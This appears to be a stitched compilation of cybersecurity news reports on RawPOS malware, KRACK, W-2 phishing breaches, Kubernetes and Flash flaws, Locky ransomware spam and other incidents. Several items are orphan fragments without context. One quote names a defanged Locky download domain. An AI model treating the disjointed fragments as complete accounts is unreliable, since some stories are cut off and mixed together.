Malware specialized in infecting Point of Sale (PoS) software has gained the ability to search and steal driver's license information, according to a report published by US cyber-security firm Trend Micro.
The collection of driver's license information surprised researchers, who haven't spotted such behavior in a PoS malware family until now.
Even more surprising was that this new data collection system was spotted in an ancient PoS malware family, and not in one of the newer players.
The name of this malware is RawPOS, a malware family that appeared way back in 2008. Typically, financial malware lives a few years, then it fizzles out and dies, as security firms learn to detect and stop it.
In spite of its old age, RawPOS stuck around, and its operators continued to update and deploy it in attacks over the years.
Like all other POS malware families, RawPOS is built to target and infect computers that run PoS software. On these PCs, the malware lies in hiding and keeps an eye on the data flowing through the computer's RAM. Using a simple regex string pattern, RawPOS scrapes the RAM until it finds data that fits the pattern.
This pattern is specifically designed to detect payment card data, such as card numbers. Across the years, the different RawPOS versions have featured different versions of this regex string pattern.
In total, security researchers have observed five different RawPOS patterns (versions). Earlier this year, Trend Micro discovered the sixth, which featured an expanded regex filter.
Besides keeping an eye on credit card data, this expanded filter scraped the infected computer's RAM for the term ""driver's license"" and ""ANSI 636.""
While not directly evident for most, ANSI 636 is a barcode format used for the 2D barcode found on US drivers' licenses.
Pharmacies, retail shops, bars, casinos and others establishments usually scan a customer's driver's license as authorization before making particular transactions, such as when buying drugs and alcohol.
This data, just like payment card data, is handled and collected by some PoS software solutions, so it makes sense seeing this new regex string pattern inside RawPOS.
Researchers believe crooks behind this malware are gathering this information to create more complete victim profiles, in order to aid various fraud operations, such as identity theft.
Even if they don't use the stolen data themselves, the breadth of data encoded in a driver's license barcode is valuable enough to sell on underground markets.
Taking into account the copycat nature of the malware scene, this new trick of collecting driver's license information will most likely spread to other PoS malware families.

Struts bugs, Umbrella misconfig and router Guest accounts fixed.
Cisco has issued security alerts for 30 vulnerabilities across a range of its products and services, with three being ranked as critical and remotely exploitable.
Some 20 different Cisco products contain a vulnerable version of the Apache Struts 2 framework that is currently under active exploitation by miscreants dropping cryptocurrency miner malware on exposed systems.
Of these, 18 are not vulnerable to any exploitation vectors for the Struts flaw, Cisco said.
Five Cisco products, SocialMiner, Identity Services Engine, Finesse, Unified Contact Centre Enterprise and the Video Distribution Suite for Internet Streaming have received patches for the Struts vulnerability.
Cisco's cloud-hosted Network Performance Analysis service is yet to get a Struts update though.
A critical flaw in the application programming interface (API) for Cisco's cloud-based Umbrella allowed attackers to view and potentially modify data across multiple organisations using the secure internet gateway service.
The vulnerability stems from insufficient authentication configurations for the Umbrella API, and has been patched by Cisco with no user action required.
Two high-impact vulnerabilities in the Umbrella Enterprise Roaming Client and Enterprise Roaming Module that could be exploited by attackers to elevate user privileges to Administrator level have also been patched by Cisco.
A third critical vulnerability can be exploited to run code remotely on the Cisco RV110W VPN firewall and RV130W and RV215W wireless VPN routers, or freeze the devices in denial of service attacks.
Patches for the vulnerability address an improper boundary restriction on input via the Guest user account in the devices' web-based remote management interface, Cisco said.
Cisco also patched three high impact vulnerabilities in the above network devices, which could be exploited to remotely execute arbitrary commands and read sensitive information on them.
Of the thirty vulnerabilities disclosed, 13 are ranked as high impact.

Vendors are reacting swiftly to a vulnerability that lets attackers eavesdrop on your network traffic.
Monday morning was not a great time to be an IT admin, with the public release of a bug that effectively broke WPA2 wireless security.
As reported previously by ZDNet, the bug, dubbed ""KRACK"" -- which stands for Key Reinstallation Attack -- is at heart a fundamental flaw in the way Wi-Fi Protected Access II (WPA2) operates.
The security protocol, an upgrade from WEP, is used to protect and secure communications between everything from our routers, mobile devices, and Internet of Things (IoT) devices, but there is an issue in the system's four-way handshake that permits devices with a pre-shared password to join a network.
According to security researcher and academic Mathy Vanhoef, who discovered the flaw, threat actors can leverage the vulnerability to decrypt traffic, hijack connections, perform man-in-the-middle attacks, and eavesdrop on communication sent from a WPA2-enabled device.
US-CERT has known of the bug for some months and informed vendors ahead of the public disclosure to give them time to prepare patches and prevent the vulnerability from being exploited in the wild -- of which there are no current reports of this bug being harnessed by cyberattackers.
The bug is present in WPA2's cryptographic nonce and can be utilized to dupe a connected party into reinstalling a key which is already in use. While the nonce is meant to prevent replay attacks, in this case, attackers are then given the opportunity to replay, decrypt, or forge packets.
In general, Windows and newer versions of iOS are unaffected, but the bug can have a serious impact on Android 6.0 Marshmallow and newer.
The attack could also be devastating for IoT devices, as vendors often fail to implement acceptable security standards or update systems in the supply chain, which has already led to millions of vulnerable and unpatched IoT devices being exposed for use by botnets.
The vulnerability does not mean the world of WPA2 has come crumbling down, but it is up to vendors to mitigate the issues this may cause.
In total, ten CVE numbers have been preserved to describe the vulnerability and its impact, and according to the US Department of Homeland Security (DHS), the main affected vendors are Aruba, Cisco, Espressif Systems, Fortinet, the FreeBSD Project, HostAP, Intel, Juniper Networks, Microchip Technology, Red Hat, Samsung, various units of Toshiba and Ubiquiti Networks.

However, there is good news since Sucuri discretely reported the vulnerability to WordPress security team who handled the matter professionally and informed as many security providers and hosts and implemented a patch before this became public.
In their blog post, Marc Alexandre Montpas from Sucuri stated that “This privilege escalation vulnerability affects the WordPress REST API that was recently added and enabled by default on WordPress 4.7.0.
One of these REST endpoints allows access (via the API) to view, edit, delete and create posts.

The REST API is enabled by default on all sites using WordPress 4.7.0 or 4.7.1.

""@POTUS turned up in my feed despite me not following, willingly or otherwise,"" said another person.
A spokesperson for Twitter told Motherboard they couldn't comment on these specific claims, but said that post-inauguration, Twitter automatically migrated the followers of @POTUS over to the newly created @POTUS44 account, which acts as an archive for President Obama's tweets.
The same was done for @FLOTUS44, belonging to Michelle Obama, and @VP44, belonging to former-Vice President Biden.

INDIANAPOLIS, Ind.– Officials at Scotty’s Brewhouse are working to inform thousands of employees across the company about an email data breach, leaking employees’ W-2 forms to an unknown suspect.
Company officials called IMPD Monday afternoon to report the breach, which apparently resulted from an email phishing scam.
According to the police report, an individual posing as company CEO Scott Wise sent an email to a payroll account employee.
The email requested the employee to send all 4,000 employees W-2 forms in PDF form.
Chris Martin, director of HR/Payroll for the company, told police the email did not really come from Wise.
However, the payroll account employee did email all 4,000 W-2 forms to the unknown individual.
The report says Martin contacted the IRS to inform the agency of the breach.
The IRS recommended Martin also file a report with IMPD.
Scotty’s Brewhouse officials are now in the process of informing all employees, and providing them with precautionary measures to take in order to protect their financial and personal information.
The company says it will offer one year of credit monitoring at no cost to employees, in addition to providing information regarding available resources for its employees to monitor their credit.
Scotty’s says no customer information was obtained during the phishing scam.
The company is working with law enforcement and the credit bureaus to limit any potential misuse of the information that was obtained and to identify and apprehend the scammers.
Scott Wise, CEO of Scotty’s Holdings, LLC, issued the following statement:
“Unfortunately, Scotty’s was the target of and fell victim to scammers, as so many other companies have,” said Wise.
“Scotty’s employees and customers are of tremendous importance to the company and Scotty’s regrets any inconvenience to its employees that may result from this scamming incident.
Scotty’s will continue to work with federal and local law enforcement, the Internal Revenue Service and credit bureaus to bring the responsible party or parties to justice”.
The incident appears to match the description of an email phishing scheme the IRS issued warnings about last year.
This scheme involves scammers posing as company executives to request financial and personal information on employees.
The IRS has online tutorials on the proper steps to take if you have become the victim of identity theft or your personal information has been leaked.

The device manufacturer acquired St Jude Medical last year and has since been working to fix severe vulnerabilities found in its pacemakers.
Abbott released its second and final round of planned cybersecurity updates to its pacemakers, programmers and remote monitoring systems to fix severe cybersecurity flaws in the devices.
The patch will update the battery performance alert, allowing the device to monitor for abnormal battery behavior and automatically vibrate to tell the patient when something is wrong.
The planned updates began last year, and the latest firmware update was approved by the Food and Drug Administration last week. The update applies to about 350,000 of Abbott’s implantable cardioverter defibrillators and implantable cardiac resynchronization therapy defibrillators.
The devices were originally manufactured by St Jude Medical, which Abbott acquired last year.
At that time, St Jude was under fire for remaining quiet about defibrillator issues that caused rapid battery depletion. The FDA found St Jude continued to ship these devices despite knowing about the defect. In fact, the agency found those flaws caused patient deaths.
The flaws, made public in 2016 by Muddy Waters and security firm MedSec, could allow an unauthorized user to access the defibrillaors and modify the programming controls. Since acquiring St Jude, Abbott has been working to patch those vulnerabilities.
The FDA’s recall notice said the firmware update will reduce the risk of patient harm due to premature battery depletion and potential exploitation of the flaws in the devices. The update will effectively complete the necessary patches to prevent unauthorized access.
The update is not a response to any new flaws, but are merely a continuation of last year’s patches, according to officials.
""Technology and its security are always evolving, and this firmware upgrade is part of our commitment to ensuring our products include the latest advancements and protections for patients,"" said Robert Ford, executive vice president of medical devices at Abbott, in a statement.

Northrop Grumman has admitted one of its internal portals was broken into, exposing employees' sensitive tax records to miscreants.
In a letter [PDF] to workers and the California Attorney General's office, the aerospace contractor said that between April 18, 2016 and March 29, 2017, crooks infiltrated the website, allowing them to access staffers' W-2 paperwork for the 2016 tax year.
These W-2 forms can be used by identity thieves to claim tax rebates owed to employees, allowing the crims to pocket victims' money. The corp sent out its warning letters on April 18, the last day to file 2016 tax returns.
""The personal information that may have been accessed includes your name, address, work email address, work phone number, Social Security number, employer identification number, and wage and tax information, as well as any personal phone number, personal email address, or answers to customized security questions that you may have entered on the W-2 online portal,"" the contractor told its employees.
The Stealth Bomber maker says it will provide all of the exposed workers with three years of free identity-theft monitoring services. Northrop Grumman has also disabled access to the W-2 portal through any method other than its internal single sign-on tool.
The aerospace giant said it farmed out its tax portal to Equifax Workforce Solutions, which was working with the defense giant to get to the bottom of the intrusion. ""Promptly after confirming the incident, we worked with Equifax to determine the details of the issue,"" Northrop told its teams.
""Northrop Grumman and Equifax are coordinating with law enforcement authorities to assist them in their investigation of recent incidents involving unauthorized actors gaining access to individuals’ personal information through the W-2 online portal.""
According to Equifax, the portal was accessed not by hackers but by someone using stolen login details.
""We are investigating alleged unauthorized access to our online portal where a person or persons using stolen credentials accessed W-2 information of a limited number of individuals,"" an Equifax spokesperson told El Reg on Monday.
""Based on the investigation to date, Equifax has no reason to believe that its systems were compromised or that it was the source of the information used to gain access to the online portal.""

Kubernetes has12 become the most popular cloud container orchestration system by far, so it was only a matter of time until its first major security hole was discovered. And the bug, CVE-2018-1002105, aka the Kubernetes privilege escalation flaw, is a doozy. It's a CVSS 9.8 critical security hole.
With a specially crafted network request, any user can establish a connection through the Kubernetes application programming interface (API) server to a backend server. Once established, an attacker can send arbitrary requests over the network connection directly to that backend. Adding insult to injury, these requests are authenticated with the Kubernetes API server's Transport Layer Security (TLS) credentials.
Worse still, ""In default configurations, all users (authenticated and unauthenticated) are allowed to perform discovery API calls that allow this escalation."" So, yes, anyone who knows about this hole can take command of your Kubernetes cluster.
Oh, and for the final jolt of pain: ""There is no simple way to detect whether this vulnerability has been used. Because the unauthorized requests are made over an established connection, they do not appear in the Kubernetes API server audit logs or server log. The requests do appear in the kubelet or aggregated API server logs, but are indistinguishable from correctly authorized and proxied requests via the Kubernetes API server.""
In other words, Red Hat said, ""The privilege escalation flaw makes it possible for any user to gain full administrator privileges on any compute node being run in a Kubernetes pod. This is a big deal. Not only can this actor steal sensitive data or inject malicious code, but they can also bring down production applications and services from within an organization's firewall.""
The only real fix is to upgrade Kubernetes.
Any program, which includes Kubernetes, is vulnerable. Kubernetes distributors are already releasing fixes.
Red Hat reports all its ""Kubernetes-based services and products -- including Red Hat OpenShift Container Platform, Red Hat OpenShift Online, and Red Hat OpenShift Dedicated -- are affected."" Red Hat has begun delivering patches and service updates to affected users.
As far as anyone knows, no one has used the security hole to attack anyone yet. Darren Shepard, chief architect and co-founder at Rancher Labs, discovered the bug and reported it using the Kubernetes vulnerability reporting process.
But -- and it's a big but -- abusing the vulnerability would have left no obvious traces in the logs. And, now that news of the Kubernetes privilege escalation flaw is out, it's only a matter of time until it's abused.
So, once more and with feeling, upgrade your Kubernetes systems now before your company ends up in a world of trouble.

An exploit discovered by a pair of security researchers allowed them to hack an iPhone X and access a photo that was supposedly deleted from the device. Apple was informed of the security hole and a fix is on the way.
As first reported by Forbes, hackers Richard Zhu and Amat Cama teamed up and discovered the hole that allowed access to deleted files on iOS devices running iOS 12. This is due to a weakness in the current public version of the Safari browser.
As per the Mobile Pwn2Own contest in Tokyo, Apple has been informed and the hackers were able to walk away with $50,000.
The hack in question would be able to retrieve more than just photos. The vulnerablitiy is found in a just-in-time compiler. These are programs that translate code while a computer rather than before. And because it’s software, it’s bound to have some vulnerabilities. Software vulnerabilities are a common occurrence due to its complex nature. While developers can continue fixing bugs, there’s no guarantee new holes won’t emerge.
The hackers were able to exploit the JIT compiler with a malicious Wi-Fi access point. However, Apple isn’t the only company at fault here. The pair of hackers were able to use the same exploits on Android devices including the Samsung Galaxy S9 and the Xiaomi Mi6.
The pair earned the “Master of Pwn” title for discovering the iPhone vulnerability along with several other exploits showcased during the event.
Apple should have this exploit patched within the next few weeks. The company will likely patch this in the next beta version of iOS 12.1.1.

Adobe has posted an update to address 85 CVE-listed security vulnerabilities in Acrobat and Reader for both Windows and macOS.
The PDF apps have received a major update that includes dozens of fixes for flaws that would allow for remote code execution attacks if exploited. Other possible attacks include elevation of privilege flaws and information disclosure vulnerabilities.
Fortunately, Adobe said that none of the bugs was currently being targeted in the wild - yet.
For Mac and Windows Acrobat/Reader DC users, the fixes will be present in versions 2019.008.20071. For those using the older Acrobat and Reader 2017 versions, the fix will be labeled 2017.011.30105.
Because PDF readers have become such a popular target for email and web-based malware attacks, users and admins alike would do well to test and install the updates as soon as possible. Exploit-laden PDFs have for more than a decade proven to be one of the most reliable ways to put malware on someone's machine.
In total, Adobe credited 19 different researchers with discovering and reporting the vulnerabilities. Among the more prolific bug hunters were Omri Herscovici of CheckPoint Software, who was credited for finding and reporting 35 CVE-listed bugs, and Ke Liu and Tencent Security Xuanwu Lab, who was credited with finding 11 of the patched Adobe vulnerabilities. Beihang University's Lin Wang was given credit for nine vulnerabilities.
While we're on the subject of massive security updates, both users and admins will want to mark their calendars for a week from Tuesday. October 9 is slated to be this month's edition of the scheduled 'Patch Tuesday' monthly security update.

Online gaming company Reality Squared Games (R2Games) has been compromised for the second time in two years, according to records obtained by the for-profit notification service LeakBase. The hacker who shared the data with LeakBase says the attack happened earlier this month.
Headquartered in Shenzhen, China, R2Games operates a number of free-to-play, micropayment-driven games on iOS and Android, as well as modern browsers. The company currently supports 19 online games, and claims over 52 million players.
In December of 2015, stretching into July of 2016, more than 22 million R2Games accounts were compromised, exposing IP addresses, easily cracked passwords, email addresses, and usernames.
The company denied the breach reports, telling one customer that ""R2Games is safe and secured, and far from being hacked.""
The hacker claims all forums were compromised, in addition to the Russian version of r2games.com.
The latest record set includes usernames, passwords, email addresses, IP addresses, and other optional record fields, such as instant messenger IDs, birthday, and Facebook related details (ID, name, access token).
LeakBase shared the most recent records with Troy Hunt, a security researcher and owner of the non-profit breach notification website ""Have I Been Pwned?"" (HIBP).
Hunt checked the data by testing a small sample of email addresses and usernames against the password reset function on R2Games. Every address checked was confirmed as an existing account. From there, Hunt did some number crunching.
There were 5,191,898 unique email addresses in the data shared by LeakBase. However, 3,379,071 of those email addresses were using mail.ar.r2games.com or mail.r2games.com; and another 789,361 looked generated, as they were all [number]@vk.com addresses.
LeakBase speculates that the r2games.com addresses are the result of registrations from third-party services.
After stripping the questionable addresses Hunt was left with 1,023,466 unique email addresses to load into HIBP. Of this set, 482,074 have been seen before in other breaches, leaving 541,392 new entries for his index – and new notifications for 1,105 subscribers.
When asked about the passwords, Hunt told Salted Hash many of them are MD5 with no salt, but a large number of them have a hash corresponding to the password ""admin"" and a few hundred thousand others are using the plain text word ""sync"".
""The observation I'd make here is that clearly, they don't seem to be learning from previous failures. The prior incident should really have been a wake-up call and to see a subsequent breach not that long after is worrying. Perhaps the prior denials are evidence that they just don't see the seriousness in security,"" Hunt said, when asked his opinion about the latest R2Games data breach.
Salted Hash reached out to R2Games, but the company didn't respond to questions. Emails were sent to support, as well as recruiting and sales, on the off chance someone could direct them to the proper resources.
For their part, LeakBase said since this data breach isn't in the public domain, they will not add the records to their service and it will not be searchable. However, they do plan to email impacted users and inform them of the incident.
HIBP has been updated, and those changes are live now.
If you're an R2Games player, it might be wise to change your password and make sure the old password isn't used on any other websites.
Also, keep an eye out for gaming related offers and emails, as well as ""notifications"" from domains that aren't related to R2Games itself - as those could be scammers looking to cash-in on the breach. While the hacked data isn't public yet, there's nothing preventing the person who shared it with LeakBase from selling it or trading it.

Last week, we reported about a cryptographer who found a supposed vulnerability in WhatsApp and later gave an interview to The Guardian explaining the matter.
The cryptographer later posted videos on YouTube explaining his findings, and WhatsApp’s response to his claims came in a timely manner.
Cryptographer Tobias Boelter claimed that Facebook and WhatsApp could potentially intercept and read encrypted messages sent within the app.
WhatsApp issued a statement saying that the alleged “backdoor” was actually an intentional design decision so that millions of messages could be delivered to their intended recipients.
The developer of WhatsApp’s encryption protocol, Open Whisper Systems, also issued a statement backing up WhatsApp’s claims.
Now it seems that security researchers from around the world have come together to defend WhatsApp and urge The Guardian to retract its story.

Last week WordPress released the newest version (4.7.2) of the popular CMS, ostensibly fixing three security issues affecting versions 4.7.1 and earlier.
What the WordPress team didn’t share at that time is that the update also secretly fixes a bug that allows unauthenticated users to modify the content of any post or page within a WordPress site.
The vulnerability was discovered by Sucuri researcher Marc-Alexandre Montpas and responsibly disclosed to the WordPress security team on January 20.
A fix was soon created, tested, and included in the security update pushed out on January 26.
The team reached out to makers of web application firewalls (WAFs) like SiteLock, Cloudflare, and Incapsula to help them create rules that would block exploitation attempts.
WordPress hosts have also been privately told of the flaw, and they quietly moved to protect their users.
“By Wednesday afternoon, most of the hosts we worked with had protections in place.
Data from all four WAFs [this includes Sucuri’s] and WordPress hosts showed no indication that the vulnerability had been exploited in the wild,” the WP security team disclosed on Wednesday.
“As a result, we made the decision to delay disclosure of this particular issue to give time for automatic updates to run and ensure as many users as possible were protected before the issue was made public”.
Within a couple of hours of the release of the update, WordPress users who have opted for the automatic WP update option had the WP 4.7.2 installed and were protected.
The unauthenticated privilege escalation vulnerability in question affects the REST API, which was added and enabled by default on WordPress 4.7.0.

More cybercriminals used object linking and embedding, or OLE packages, to deliver malware content during the first quarter of 2017, according to cybersecurity technology and services company PhishMe Intelligence.
The cyberthreat trend first was observed in December 2016, closely associated to the delivery of the Ursnif botnet malware, PhishMe said. The OLE technique abuses Microsoft Office documents by prompting a victim to double-click an embedded icon to access some type of content. These objects are used to write a script application to the disk that facilitates the download and execution of a malware payload, PhishMe said. This method adds another set of techniques cybercriminals can use to evade anti-analysis and sandbox settings and to successfully infect computer systems, the company said.
The threatening documents employ a similar look and feel to Microsoft Office documents using macro elements for malware delivery, but they do not feature the distinctive “enable macros” banner, PhishMe said. As a result, these documents defy the expectations for the delivery of malware that have been prominent in recent years.
For example, a macro element can display icons or text that instruct a victim to “enable editing” in order to interact with a document and view content, but a document using the threatening OLE packages will not feature the characteristic yellow “enable macros” banner. The technique allows cybercriminals to deploy malicious files to a victim’s machine. Real and fake documents look similar, and the fake ones can fool even computer users who know what a macro looks like.
  A screen shot of the OLE Malware
There are several reasons why these recent phishing campaigns distributing infected Microsoft OLE packages are particularly tricky to deal with, said Rohyt Belani, co-founder and CEO of PhishMe.
“First, because the malware is disguised as an unassuming Office document, threat actors can often use this technique to bypass the IT department’s sandbox environments, detection software or analysis tools that help identify malicious documents, attachments and links,” Belani said. “Second, since so many healthcare organizations rely on Microsoft Office applications to run their day-to-day business operations, security professionals can’t completely block Office documents entirely from e-mail systems.
When technology layers fail and let these types of threats land in the inbox, there’s really one last line of defense to ensure these attacks don’t succeed – the employees themselves, Belani said.
“Humans, the end-users, are the linchpin for securing against attacks delivering sneaky payloads that easily bypass existing technology stacks,” Belani said. “We recommend healthcare CISOs seriously consider building strong phishing defense programs that transform employees into human sensors at the heart of the phishing defense strategy.”
Through behavioral conditioning, employees will become contextually aware of the e-mail content that enters their inbox, increasing their ability to recognize and report suspicious communications that very well may be phishing threats like OLE payloads, Belani said.
“By empowering employees to report suspicious e-mails directly to a healthcare organization’s security operations center,” Belani added, “this will drastically speed incident response capabilities to neutralize these threats before any major damage is inflicted.”

A new attack campaign has been flinging phishing messages as well as ransomware-laced spam emails at potential victims in massive quantities.
The attack campaign involves crypto-locking Locky ransomware.
""Beware. Don't fall for this. Locky is horrid,"" says Alan Woodward, a computer science professor at the University of Surrey.
The campaign began Monday, according to cloud-based cybersecurity provider AppRiver, which counted more than 23 million related spam emails having been sent in less than 24 hours. That makes it ""one of the largest malware campaigns that we have seen in the latter half of 2017,"" says Troy Gill, manager of security research for AppRiver, in a blog post.
Finnish security firm F-Secure says that the majority of the spam messages that its systems are currently blocking relate to Locky. It notes that some spam contains links to infected sites, while other messages carry malicious attachments.
If a system becomes infected with this strain of Locky, crypto-locked files will have the extension "".lukitus"" added, which is a Finnish word variously translated by native speakers as ""locking"" or ""locked,"" according to F-Secure.
The Lukitus variant of Locky was first spotted last month. Rommel Joven, a malware researcher with security firm Fortinet, warned that it was being distributed via email attachments as part of a massive spam campaign being run by the one of the world's biggest botnets, Necurs, which has historically been the principle outlet for Locky attacks.

Spam Can Carry Locky Attachments
AppRiver says emails related to the new Locky campaign have featured a variety of subject lines, including these words: documents, images, photo, pictures, please print, scans.
""Each message comes with a zip attachment that contains a Visual Basic Script (VBS) file that is nested inside a secondary zip file,"" Gill says. ""Once clicked, [the] VBS file initiates a downloader that reaches out to greatesthits[dot]mygoldmusic[dotcom] to pull down the latest Locky ransomware. Locky goes to work encrypting all the files on the target system and appending [.]lukitus to the users now-encrypted files.""
The ransomware then drops a ransom note on the victim's desktop. ""The victim is instructed to install the Tor browser and is provided an .onion (aka Darkweb) site to process payment of 0.5 bitcoins"" - currently worth $2,400 - Gill says. ""Once the ransom payment is made the attackers promise a redirect to the decryption service.""
As of Friday, meanwhile, Xavier Mertens, a freelance security consultant and SANS Institute Internet Storm Center contributor based in Belgium, says he's seeing a new wave of malicious spam that uses emails that pretend to carry voice messages.
Internet Storm Center reports that some malicious messages tied to Locky are showing fake alerts stating that the HoeflerText font needs to be installed.
Not all of the Locky spam emails arrive with malicious attachments; some are designed as phishing attacks that redirect users to real-looking but malicious sites.
Peter Kruse, an e-crime specialist at CSIS Security Group in Denmark, says some emails related to this ransomware campaign are skinned to look like they've come from Dropbox. Some will attempt to trick recipients into clicking on a ""verify your email"" link. Kruse says the attacks are being launched by the group tied to the Affid=3 [aka affiliate ID=3] version of Locky. 
If victims click on the link, they're redirected to one of a number of websites.
Clicking on a link can result in a zipped attack file being downloaded, per the VBS attack detailed above, according to security researcher JamesWT, a former member of the anti-malware research group called Malware Hunter Team.
Alternately, clicking on the link may result in the site attempting to execute a malicious JavaScript file that functions as a dropper, meaning it then attempts to download a payload file.
In some attacks, this payload file is Locky. But JamesWT tells ISMG that malware from the campaign that he uploaded to malware-checking service VirusTotal was identified as being Shade ransomware.

Adobe on Wednesday released several unscheduled fixes for Flash Player, including a critical vulnerability that it said is being exploited in the wild.
The critical vulnerability, CVE-2018-15982, is a use-after-free flaw enabling arbitrary code-execution in Flash.
“Adobe has released security updates for Adobe Flash Player for Windows, macOS, Linux and Chrome OS,” Adobe said in its release. “These updates address one critical vulnerability in Adobe Flash Player and one important vulnerability in Adobe Flash Player installer. Successful exploitation could lead to arbitrary code-execution and privilege-escalation in the context of the current user respectively.”
The flaw was discovered by Chenming Xu and Ed Miles of Gigamon ATR. Researchers also outlined the further technical details about the exploit of the vulnerability.
Impacted is Adobe Flash Player Desktop Runtime, Adobe Flash Player for Google Chrome; Adobe Flash Player for Microsoft Edge and Internet Explorer 11; all for versions 31.0.0.153 and earlier. Adobe Flash Player Installer versions 31.0.0.108 and earlier is also affected.
Users of these impacted products can update to version 32.0.0.101, according to Adobe. Users of Adobe Flash Player Installer can update to version 31.0.0.122.
Adobe also patched an important-rated insecure library loading (via DLL hijacking) vulnerability, CVE-2018-15983, that could lead to privilege escalation via Adobe Flash.
This is only the latest exploit to hit Adobe Flash – earlier in June, a zero-day Flash vulnerability was is being exploited in the wild in targeted attacks against Windows users in the Middle East, according to researchers. Adobe dealt with another zero-day Flash vulnerability back in February, which was exploited by North Korean hackers.

Small and medium businesses across Europe are being actively targeted by ransomware attacks, new research has shown.
According to data protection firm Datto, 87% of European IT service providers it surveyed said their SMB customers had been hit by a ransomware attack at some point during the previous 12 months. Additionally, 40% of respondents reported multiple attacks during that time. Just over a quarter of respondents (27%) reported experiencing multiple attacks in a single day.
In terms of the impact these attacks are having, the survey revealed the average ransom demanded was between £500 and £2000. In 15% of reported cases the demand was in excess of £2000. Nearly half (47%) said paying the ransom was ineffective, as they still lost some of the data that had been encrypted by the attackers.
As well as financial penalties, ransomware attacks can also impact the business in other ways. A majority of respondents (62%) said they’d experienced downtime during the attack. For smaller organizations, the combination of financial loss and downtime can threaten the continued operation of the business, Datto said.
Frustratingly, just 40% of ransomware victims end up reporting the crime to the authorities. The FBI has previously said that reporting ransomware attacks will help it get a better understanding of exactly how many attacks are occurring as well as help the industry develop its defenses; traditional antivirus has so far proved to be ineffectual against most ransomware.
“Ransomware is more than just a nuisance; it’s a major money-making operation backed by professional and well-funded organizations,” said Andrew Stuart, managing director, EMEA at Datto.

Jann Horn, the Google Project Zero researcher who discovered the Meltdown and Spectre CPU flaws, has a few words for maintainers of Ubuntu and Debian: raise your game on merging kernel security fixes, you're leaving users exposed for weeks.
Horn earlier this week released an ""ugly exploit"" for Ubuntu 18.04, which ""takes about an hour to run before popping a root shell"".
The kernel bug is a cache invalidation flaw in Linux memory management that has been tagged as CVE-2018-17182, reported to Linux kernel maintainers on September 12.
Linux founder Linus Torvalds fixed it in his upstream kernel tree two weeks ago, an impressively fast single day after Horn reported the issue. And within days it was also fixed in the upstream stable kernel releases 4.18.9, 4.14.71, 4.9.128, and 4.4.157. There's also a fix in release 3.16.58.
However, end users of Linux distributions aren't protected until each distribution merges the changes from upstream stable kernels, and then users install that updated release.
Between those two points, the issue also gets exposure on public mailing lists, giving both Linux distributions and would-be attackers a chance to take action.
""The security issue was announced on the oss-security mailing list on 2018-09-18, with a CVE allocation on 2018-09-19, making the need to ship new distribution kernels to users clearer,"" Horn wrote in a Project Zero post published Wednesday.
But as he noted, as of Wednesday, Debian stable and Ubuntu releases 16.04 and 18.04 had not fixed the issue, with the latest kernel update occurring around a month earlier. This means there's a gap of several weeks between the flaw being publicly disclosed and fixes reaching end users.
However, the Fedora project was a little faster, pushing a fix to users on 22 September.
Canonical, the UK company that maintains Ubuntu, has since responded to Horn's blog, and says fixes ""should be released"" around Monday, October 1.
This is unlikely to be the last kernel bug Project Zero researchers find, and unless Ubuntu and other Linux distributions get their act together on upstream kernel fixes, they can expect to be named and shamed again.

Family genealogy and DNA testing site MyHeritage announced on Monday a security breach during which an attacker made off with account details for over 92 million MyHeritage users.
In a statement on its website, MyHeritage said it became aware of the incident on Monday, the same day of the announcement.
The incident came to light after a security researcher found an archive on a third-party server containing the personal details of 92,283,889 MyHeritage users.
Only emails and hashed password were exposed.
The archive contained only emails and hashed passwords, but not payment card details or DNA test result. MyHeritage says it uses third-party payment processors for financial operations, meaning payment data was never stored on its systems, while DNA test results were saved on separate servers from the one that managed user accounts.
Based on the creation dates of some accounts, the breach appears to have taken place on October 26, 2017. It is unclear if the breach is the result of a hacker attack or because of a malicious employee selling the company's data.
MyHeritage says that user accounts are safe, as the passwords were hashed using a per-user unique cryptographic key.
""MyHeritage does not store user passwords, but rather a one-way hash of each password, in which the hash key differs for each customer,"" the company said. ""Since Oct 26, 2017 (the date of the breach) and the present we have not seen any activity indicating that any MyHeritage accounts had been compromised.""
The company announced the breach in the same day it found out about it because of the EU's GDPR legislation that forces companies activating in the EU to disclose any security incident within three days of finding out.
MyHeritage says it has now reached out to a cyber-security firm to help it investigate the breach severity and what other systems the hacker might have accessed. 
MyHeritage to roll out 2FA
The company also promised to roll out a two-factor authentication (2FA) feature for user accounts, so even if the hacker manages to decrypt the hashed passwords, these would be useless without the second-step verification code.
It goes without saying that MyHeritage users should change their passwords as soon as possible.
The MyHeritage incident marks the biggest data breach of the year, and the biggest leak since last year's Equifax hack.

Democrats in Pennsylvania’s state Senate were locked out of their computer network early Friday morning due to a ransomware attack, NBC News reports.
According to an unidentified state official who spoke with NBC, the Democratic senators in Harrisburg use their own computer network and “there is no indication that other state agencies of the Republicans have been affected”.
As of about 5 p.m. Friday, both law enforcement agencies and Microsoft were working with the state Democrats to free their network.
In a statement sent to reporters via text message and obtained by The Hill, state party officials said, “there is currently no indication that the caucus system was targeted or that any data has been compromised”.
Recently, ransomware attacks have struck everywhere from hospitals and universities to San Francisco’s transit system.
Last summer, the congressional IT desk warned representatives in Washington DC to be careful of potential ransomware and phishing threats, but the hacks on the DNC were unrelated.
In many cases, the payment demanded is only in the tens of thousands of dollars, and occasionally ransomware can be spammed without a specific target, but the affected computer systems are encrypted and inaccessible until the hackers release a key.
If a network’s data is backed up offsite, the target can occasionally circumvent the ransom altogether — albeit with some increased security.
A spokesperson for the Pennsylvania Democrats declined to say to NBC News whether that was possible in this case, or whether the attackers had revealed any motives.

Bristol Airport authorities were recently forced to take their flight information system displays offline for two days to contain a ransomware attack. The authorities dismissed the ransom demand and decided to rebuild the affected systems. For two days, flight status information was displayed on whiteboards and there was an increase in announcements over the speakers. Similarly, in the last few months there have been several cyberattacks targeting hospitals, city administration and sporting events. The servers of the US-based PGA were reportedly hit by ransomware attacks right before the PGA Championship in the first week of August.
A new ransomware called Everlasting Blue Blackmail Virus, which targets Windows PCs using spam and phishing campaigns, flashes former US President Barrack Obama’s image with the ransom message. Once the ransomware gains entry into the system, its looks for all .exe (executable) files and encrypts them, preventing users from running apps until the ransom is paid.
Hot on the heels of the cyberattack on the town of Valdez in Alaska, Canadian town Midland in Ontario was hit by a ransomware attack in the first week of September. Hackers broke into the city database involving fire, water, and waste management and blocked access, demanding ransom.
